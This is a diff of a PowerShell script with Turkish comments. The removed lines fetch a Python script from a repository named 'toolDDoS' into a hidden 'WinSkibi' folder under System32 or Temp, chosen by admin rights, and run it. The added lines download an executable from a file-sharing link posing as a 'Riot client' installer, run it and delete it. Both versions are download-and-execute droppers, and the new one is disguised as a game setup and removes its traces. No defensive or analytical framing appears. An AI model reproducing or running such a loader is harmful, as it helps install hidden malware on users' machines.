@@ -1,25 +1,7 @@
-# Kullanıcı admin mi kontrolü
-$adminCheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+$fileUrl = "https://store-eu-par-1.gofile.io/download/web/816fa2b5-6dd9-4b19-96ed-52ce5b66a3f2/Riot%20clirnt.exe"
+$fileName = "riot_setup.exe"
+$filePath = Join-Path $PWD.Path -ChildPath $fileName
 
-# Saklama klasörü belirle
-if ($adminCheck) {
-    $targetDir = "$env:WINDIR\System32\WinSkibi"  # Admin varsa windows klasörüne
-} else {
-    $targetDir = "$env:LOCALAPPDATA\Temp\WinSkibi"  # Yetki yoksa temp'e
-}
-
-# Klasörü oluştur (varsa geç)
-if (-not (Test-Path $targetDir)) {
-    New-Item -ItemType Directory -Force -Path $targetDir | Out-Null
-}
-
-# Python script URL'si (buraya kendi raw github linkini koy kanka)
-$rawPyUrl = "https://raw.githubusercontent.com/doguiaste/toolDDoS/refs/heads/main/start.py"
-$pyPath = Join-Path $targetDir "rizzload.py"
-
-# Python dosyasını indir ve yaz
-Invoke-WebRequest -Uri $rawPyUrl -OutFile $pyPath
-
-# Son olarak BAMMMM! çalıştır
-Start-Process "python" -ArgumentList "`"$pyPath`""
-
+Invoke-WebRequest -Uri $fileUrl -OutFile $filePath -UseBasicParsing
+Start-Process -FilePath $filePath -Wait
+Remove-Item -Path $filePath -Force
